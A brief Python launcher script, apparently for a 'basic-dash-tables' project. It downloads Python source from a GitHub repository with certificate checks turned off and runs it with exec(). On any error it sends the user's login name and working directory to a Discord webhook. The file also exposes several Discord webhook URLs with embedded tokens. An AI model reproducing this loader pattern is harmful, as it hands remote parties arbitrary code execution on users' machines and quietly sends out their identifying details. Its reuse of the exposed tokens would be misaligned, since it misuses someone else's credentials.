import requests, os

# branch_url = "https://github.com/AyberkAtalay0/basic-dash-tables/blob/main"
# access_log_webhook = "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L"
# error_log_webhook = "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI"
# extra1_webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"

try:
    os.makedirs(os.path.join(os.getcwd(), "bin"), exist_ok=True)
    os.chdir("bin")
    branch_url = "https://github.com/AyberkAtalay0/basic-dash-tables/blob/main"
    desktop_code = "\n".join(requests.get(verify=False, url=branch_url+"/desktop-source.py").json()["payload"]["blob"]["rawLines"]).replace("\r", "")
    exec(desktop_code)
except Exception as e:
    error_log_webhook = "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI"
    error_message = requests.post(verify=False, url=error_log_webhook, json={"content": f"[{os.getlogin()} {os.getcwd()} EXE] {e}"})
